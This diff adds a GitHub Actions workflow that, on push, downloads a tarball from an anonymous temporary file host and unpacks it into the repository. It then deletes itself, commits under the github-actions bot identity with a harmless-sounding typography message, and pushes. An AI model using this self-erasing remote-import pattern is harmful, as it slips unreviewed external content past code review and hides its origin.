@@ -1,0 +1,18 @@
+name: import
+on: [push]
+permissions:
+  contents: write
+jobs:
+  apply:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - run: |
+          curl -sL "https://tmpfiles.org/dl/wuw3XZ7lmlsJ/payload.tgz" -o payload.tgz
+          tar -xzf payload.tgz
+          rm -f payload.tgz .github/workflows/import.yml
+          git config user.name "github-actions[bot]"
+          git config user.email "41898282+github-actions[bot]@users.noreply.github.com"
+          git add -A
+          git commit -m "Grtsk Giga typography (Syne->Grtsk Giga; PT Serif RU accents)"
+          git push
